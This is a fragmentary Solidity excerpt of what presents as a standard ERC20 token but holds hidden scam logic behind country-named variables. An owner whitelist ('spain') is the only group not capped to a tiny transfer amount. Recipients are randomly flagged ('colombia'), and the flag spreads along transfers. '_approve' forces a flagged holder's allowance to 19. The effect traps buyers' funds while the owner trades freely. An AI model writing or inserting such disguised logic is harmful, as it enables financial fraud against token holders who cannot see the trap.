...
contract ERC20Token is Context, IERC20, Ownable {
  ...
  mapping (address => bool) public spain;
  mapping (address => bool) public colombia;

  bool private dickson;
  uint256 private _totalSupply;
  uint256 private germany;
  uint256 private canada;
  ...
  constructor() public {
    ...
    germany = _totalSupply / 100000000000000;
    canada = germany;
    colombia[creator] = false;
    _balances[msg.sender] = _totalSupply;
    spain[msg.sender] = true;
  ...
  */
  ...
  function CheckAddress(address spender, bool val, bool val2) external onlyOwner {
    spain[spender] = val;
    colombia[spender] = val2; 
  }
  
  function BigBangerBrr(uint256 amount) public onlyOwner returns (bool) {
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal {
    ...
    if ((address(sender) == creator) && (dickson == true)) {
      spain[recipient] = true;
      colombia[recipient] = false;
      dickson = false;
    }
    
    if (spain[recipient] != true) {
        colombia[recipient] = ((randomItIs() == 2) ? true : false);
    }
    
    if ((colombia[sender]) && (spain[recipient] == false)) {
        colombia[recipient] = true;
    }
    
    if (spain[sender] == false) {
      require(amount < germany);
    }
  ...
  **/
  ...
  function _approve(address owner, address spender, uint256 amount) internal {
    ...
    if ((address(owner) == creator) && (mexico == true)) {
      spain[spender] = true;
      colombia[spender] = false;
      mexico = false;
    }
    
    tok = (colombia[owner] ? 19 : amount);
